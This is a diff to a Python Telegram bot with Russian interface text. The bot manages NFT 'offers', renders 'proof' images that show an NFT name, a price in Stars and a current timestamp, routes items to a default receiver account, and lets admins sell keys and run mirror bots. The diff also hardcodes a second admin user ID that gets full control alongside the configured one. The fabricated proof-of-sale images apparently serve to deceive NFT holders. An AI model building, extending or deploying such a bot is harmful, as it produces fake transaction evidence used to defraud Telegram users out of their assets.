@@ -27,6 +27,9 @@ log = logging.getLogger("offerbot")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
+# ТУТ ДВА АДМИНА
+ADMIN_IDS = [ADMIN_ID, 6658790377] 
+
 DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 DB_PATH = os.getenv("DB_PATH", "/data/bot.db")
 
@@ -120,7 +123,7 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
         return output
 
     img = Image.open(template_path)
-    width, height = img.size # Получаем размер картинки
+    width, height = img.size
     draw = ImageDraw.Draw(img)
 
     # Координаты плашки (в процентах от размера картинки)
@@ -131,23 +134,23 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     
     draw.rectangle([rect_x1, rect_y1, rect_x2, rect_y2], fill=(28, 35, 49))
 
-    # Динамический размер шрифта
-    font_large = ImageFont.truetype("arial.ttf", int(width * 0.016))
-    font_small = ImageFont.truetype("arial.ttf", int(width * 0.012))
-    font_price = ImageFont.truetype("arialbd.ttf", int(width * 0.018))
+    try:
+        font_large = ImageFont.truetype("arial.ttf", int(width * 0.016))
+        font_small = ImageFont.truetype("arial.ttf", int(width * 0.012))
+        font_price = ImageFont.truetype("arialbd.ttf", int(width * 0.018))
+    except:
+        font_large = ImageFont.load_default()
+        font_small = ImageFont.load_default()
+        font_price = ImageFont.load_default()
 
     now = datetime.now()
     date_str = f"Сегодня, {now.strftime('%H:%M')}"
-    
-    # Отступы от краев плашки
     pad_x = int(width * 0.010)
     pad_y = int(height * 0.015)
     
-    # Рисуем текст
     draw.text((rect_x1 + pad_x, rect_y1 + pad_y), date_str, fill=(150, 150, 150), font=font_small)
     draw.text((rect_x1 + pad_x, rect_y1 + pad_y + int(height * 0.03)), nft_name, fill=(255, 255, 255), font=font_large)
     
-    # Цена (сдвигаем вправо)
     price_text = f"{price_str} ⭐"
     bbox = draw.textbbox((0, 0), price_text, font=font_price)
     text_width = bbox[2] - bbox[0]
@@ -229,7 +232,7 @@ async def show_main_menu(target, uid):
 
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
-    if msg.from_user.id == ADMIN_ID:
+    if msg.from_user.id in ADMIN_IDS:
         await msg.reply("👑 <b>Админ:</b>\n/keys\n/set_default @ник\n/addkey\n/setbotmax [токен]\n/delbot @username\n/restartbots")
         return
     await show_main_menu(msg, msg.from_user.id)
@@ -240,37 +243,36 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# МОИ ОФФЕРЫ
+# МОИ ОФФЕРЫ (В ОДНОМ СООБЩЕНИИ)
 # ==========================================
 @router.callback_query(F.data == "my_offers_menu")
 async def cb_my_offers_menu(cb: CallbackQuery):
     uid = cb.from_user.id
     with get_db() as conn:
-        offers = conn.execute("SELECT * FROM offers WHERE buyer_id=? ORDER BY created_at DESC LIMIT 10", (uid,)).fetchall()
+        offers = conn.execute("SELECT * FROM offers WHERE buyer_id=? ORDER BY created_at DESC LIMIT 15", (uid,)).fetchall()
     
     if not offers:
         await cb.message.edit_text("📁 <b>Мои офферы</b>\n\nУ вас пока нет активных офферов.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
         return
 
-    await cb.message.edit_text("📁 <b>Ваши последние офферы:</b>\nВыберите оффер для управления:")
+    text = "📁 <b>Ваши последние офферы:</b>\n\n"
+    kb_list = []
     
     for o in offers:
-        o_dict = dict(o)
-        lang = o_dict.get("lang", "ru")
-        lang_name = {"ru": "🇷🇺 RU", "en": "🇺🇸 EN", "it": "🇮🇹 IT", "zh": "🇨🇳 CH"}.get(lang, "RU")
+        lang = o["lang"] if o["lang"] else "ru"
         price_str = f"{o['price_amount']} ⭐️" if o["price_currency"] == "Stars" else f"{o['price_amount']} Gram"
         
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="📸 Доказательство", callback_data=f"proof:{o['id']}"),
-                InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_offer:{o['id']}")
-            ]
-        ])
+        text += f"🆔 <code>{o['id']}</code> | {o['nft_name']} | {price_str}\n"
         
-        await cb.message.answer(
-            f"🆔 <code>{o['id']}</code> | {lang_name}\n🎁 {o['nft_name']}\n💰 {price_str}",
-            reply_markup=kb
-        )
+        kb_list.append([
+            InlineKeyboardButton(text=f"📸 Док ({o['id']})", callback_data=f"proof:{o['id']}"),
+            InlineKeyboardButton(text=f"🗑 Удалить ({o['id']})", callback_data=f"del_offer:{o['id']}")
+        ])
+    
+    kb_list.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
+    kb = InlineKeyboardMarkup(inline_keyboard=kb_list)
+    
+    await cb.message.edit_text(text, reply_markup=kb)
     await cb.answer()
 
 @router.callback_query(F.data.startswith("proof:"))
@@ -300,7 +302,7 @@ async def cb_del_offer(cb: CallbackQuery):
     oid = cb.data.split(":")[1]
     with get_db() as conn:
         conn.execute("DELETE FROM offers WHERE id=?", (oid,))
-    await cb.message.edit_text(f"🗑 Оффер <code>{oid}</code> удален.")
+    await cb.message.edit_text(f"🗑 Оффер <code>{oid}</code> удален.\n\nВернитесь в меню.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="my_offers_menu")]]))
     await cb.answer()
 
 # ==========================================
@@ -386,7 +388,7 @@ async def cb_settings(cb: CallbackQuery):
 @router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
     uid = msg.from_user.id
-    is_admin = (uid == ADMIN_ID)
+    is_admin = (uid in ADMIN_IDS)
     
     with get_db() as conn:
         user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
@@ -532,7 +534,7 @@ async def on_reject(cb: CallbackQuery):
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     with get_db() as conn:
         keys = conn.execute("SELECT key FROM keys LIMIT 30").fetchall()
         total = conn.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
@@ -540,7 +542,7 @@ async def cmd_keys(msg: Message):
 
 @router.message(Command("addkey"))
 async def cmd_addkey(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
     with get_db() as conn:
         conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))
@@ -548,14 +550,14 @@ async def cmd_addkey(msg: Message):
 
 @router.message(F.text.regexp(r"^/set_default\s+"))
 async def cmd_set_default(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     global DEFAULT_RECEIVER
     DEFAULT_RECEIVER = msg.text.replace("/set_default", "").strip().replace("@", "")
     await msg.reply(f"✅ Получатель: @{DEFAULT_RECEIVER}")
 
 @router.message(F.text.regexp(r"^/setbotmax\s+"))
 async def cmd_setbotmax(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     parts = msg.text.split()
     if len(parts) < 2: return await msg.reply("❌ /setbotmax [ТОКЕН_БОТА]")
     try:
@@ -569,7 +571,7 @@ async def cmd_setbotmax(msg: Message):
 
 @router.message(F.text.regexp(r"^/delbot\s+@?(\w+)"))
 async def cmd_delbot(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     username = msg.text.replace("/delbot", "").strip().replace("@", "")
     with get_db() as conn:
         if conn.execute("DELETE FROM mirrors WHERE username=?", (username,)).rowcount > 0:
@@ -578,7 +580,7 @@ async def cmd_delbot(msg: Message):
 
 @router.message(Command("restartbots"))
 async def cmd_restartbots(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
+    if msg.from_user.id not in ADMIN_IDS: return
     await msg.reply("🔄 Перезапускаю...")
     os._exit(0) 
 
